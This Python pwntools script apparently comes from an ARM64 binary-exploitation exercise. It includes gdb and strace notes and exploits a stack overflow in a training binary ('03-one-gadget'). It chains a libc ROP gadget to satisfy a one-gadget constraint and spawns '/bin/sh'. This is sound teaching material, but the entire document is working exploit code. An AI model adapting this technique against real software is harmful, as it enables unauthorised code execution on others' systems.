#!/usr/bin/python

"""
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000400678 <+0>:	stp	x29, x30, [sp, #-32]!
...
   0x0000000000400690 <+24>:	ldp	x29, x30, [sp], #32
   0x0000000000400694 <+28>:	ret
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x40063c: file src/03-one-gadget.c, line 6.
(gdb) b *0x0000000000400690
Breakpoint 2 at 0x400690: file src/03-one-gadget.c, line 17.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/03-one-gadget.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd90 ""
(gdb) c
Continuing.

Breakpoint 2, main (argc=1, argv=0x40007fff68) at src/03-one-gadget.c:17
17	}
(gdb) i r  $sp
sp             0x40007ffe10	0x40007ffe10
"""

"""
$ qemu-aarch64 -L /usr/aarch64-linux-gnu/ -strace ./bin/arm64/03-one-gadget
...
31623 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
31623 mmap(NULL,1413976,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0000004000852000
...
"""

"""
$ one_gadget /usr/aarch64-linux-gnu/lib/libc-2.27.so 
0x63e80 execl("/bin/sh", x1)
constraints:
  x1 == NULL
...
"""

"""
ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc-2.27.so
0x0002c490: ldr x1, [x29, #0x18]; ldp x29, x30, [sp], #0x20; mov x0, x1; ret;
"""

import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/03-one-gadget'
libc_path = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

saved_x30_addr = 0x40007ffe10 + 8
buffer_addr = 0x40007ffd90
libc_addr = 0x0000004000852000

one_gadget_addr = libc_addr + 0x63e80
ldr_x1_x30_ret_addr = libc_addr + 0x0002c490

libc = ELF(libc_path)
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()
zero_addr = libc_addr + libc.search(p64(0)).next()

p = process(binary_path)
#p = gdb.debug([binary_path])

# Need to satisfy that x1 == NULL constraint.
payload = ''
payload += 'a' * (saved_x30_addr - buffer_addr - 8)
payload += p64(zero_addr - 0x18) # x29
payload += p64(ldr_x1_x30_ret_addr)
payload += 'b' * 16
payload += p64(0) # x29
payload += p64(one_gadget_addr) # x30

p.readuntil('> ')
p.write(payload)
p.interactive()
